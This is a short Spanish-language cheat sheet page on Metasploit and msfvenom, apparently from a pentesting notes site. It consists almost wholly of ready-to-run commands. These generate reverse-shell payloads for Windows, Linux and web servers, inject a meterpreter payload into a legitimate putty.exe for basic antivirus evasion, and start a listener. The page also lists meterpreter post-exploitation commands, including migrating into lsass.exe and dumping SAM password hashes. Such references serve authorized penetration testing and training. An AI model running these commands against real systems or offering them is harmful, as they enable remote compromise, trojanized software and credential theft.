---
title: "Metasploit & MsfVenom"
layout: "single"
category: "Shells"
slug: "shells/metasploit"
date: "2025-11-26"
---

### Generación de Payloads (MsfVenom)

**Windows (.exe):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe
```

**Linux (.elf):**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf -o shell.elf
```

**Web (PHP / ASPX / JSP):**
```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw > shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war > shell.war
```

**Inyectar en binario legítimo (Evasión básica):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -x putty.exe -k -f exe > putty_evil.exe
```

---

### Manejo de Sesiones (Metasploit)

**Listener (Multi Handler):**
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 443
run
```

**Comandos Meterpreter:**
* `sysinfo`: Información del sistema.
* `getuid`: Quién eres.
* `getprivs`: Privilegios (SeDebug, etc).
* `migrate <PID>`: Moverse a otro proceso (ej: lsass.exe, explorer.exe) para ganar estabilidad.
* `upload` / `download`: Transferir archivos.
* `hashdump`: Volcar hashes SAM.
